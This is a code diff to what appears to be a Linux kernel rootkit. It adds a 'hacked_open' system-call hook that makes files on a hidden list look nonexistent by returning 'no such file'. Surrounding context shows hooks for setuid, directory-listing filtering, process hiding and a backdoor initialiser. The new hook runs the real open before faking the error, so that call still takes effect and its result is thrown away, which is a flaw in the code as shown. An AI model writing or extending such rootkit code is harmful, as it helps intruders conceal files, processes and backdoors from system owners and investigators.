@@ -33,6 +33,50 @@ asmlinkage long hacked_setuid(uid_t uid)
     return ret;
 }
 
+// Intercepts open to see if the user is somehow trying
+// to open a file that we are hiding.
+asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode)
+{
+    long ret;
+    char *kern_buff = NULL;
+    int i;
+
+    DEBUG("Entered HACKED OPEN");
+    
+    ret  = (*orig_open)(filename, flags, mode);
+    
+    kern_buff = kzalloc(strlen_user(filename)+1, GFP_KERNEL);
+    if(!kern_buff)
+    {
+        DEBUG("RAN OUT OF MEMORY in CAT Filter");
+        goto cleanup;
+    }
+
+    if(copy_from_user(kern_buff, filename, strlen_user(filename)))
+    {   
+        DEBUG("PROBLEM COPYING FILENAME FROM USER in CAT Filter");
+        goto cleanup;
+    }
+
+    for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
+    {
+        // Hidden file is found
+        if(strstr(kern_buff, HIDDEN_FILES[i]) != NULL)
+        {
+            // Simulate no such file existing and return -1 as the result of open
+            ret = -ENOENT;
+            break;
+        }
+    }
+    
+    DEBUG("Exited HACKED OPEN");
+
+cleanup:
+    if(kern_buff)
+        kfree(kern_buff);
+    return ret;
+}
+
 // Will hide any files from within the dirp and return the new length of dirp
 long handle_ls(struct linux_dirent *dirp, long length)
 {
@@ -350,6 +394,8 @@ static int __init initModule(void)
 
     HOOK_SYSCALL(sys_call_table, orig_setuid, hacked_setuid, __NR_setuid);
 
+    HOOK_SYSCALL(sys_call_table, orig_open, hacked_open, __NR_open);
+
     init_hide_processes();
 
     init_filter_backdoor();
@@ -366,6 +412,8 @@ static void __exit exitModule(void)
     set_addr_rw((unsigned long) sys_call_table);
 
     UNHOOK_SYSCALL(sys_call_table, orig_setuid, __NR_setuid);
+
+    UNHOOK_SYSCALL(sys_call_table, orig_open, __NR_open);
 
     exit_hide_processes();
 
